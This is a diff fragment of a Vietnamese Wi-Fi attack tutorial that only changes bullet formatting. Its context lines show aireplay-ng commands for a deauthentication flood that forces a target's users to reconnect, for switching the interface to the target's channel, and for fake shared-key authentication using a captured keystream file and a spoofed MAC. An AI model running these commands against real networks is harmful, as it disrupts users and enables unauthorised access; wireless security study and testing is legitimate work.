@@ -262,11 +262,11 @@ Send gói tin deauthen để bắt các user phải đăng nhập lại để ta
 aireplay-ng --deauth 0 -a <target's bssid> -c  < true user MAC >  wlan0
 ```
 [![Deauthen.png](https://www.upsieutoc.com/images/2020/06/17/Deauthen.png)](https://www.upsieutoc.com/image/frFmc1)
-* Setup interface sang chanel của target.
+**Setup interface sang chanel của target.**
 ```
 iwconfig wlan0 channel < target's chanel >
 ```
-* Bắt đầu gửi gói tin challenge fake.
+**Bắt đầu gửi gói tin challenge fake.**
 ```
 aireplay-ng -1 0 -e  < target's essid >  -y keystream-01-E8-94-F6-3C-2D-D8.xor -a <target's bssid> -h < Mac fake > wlan0
 ```
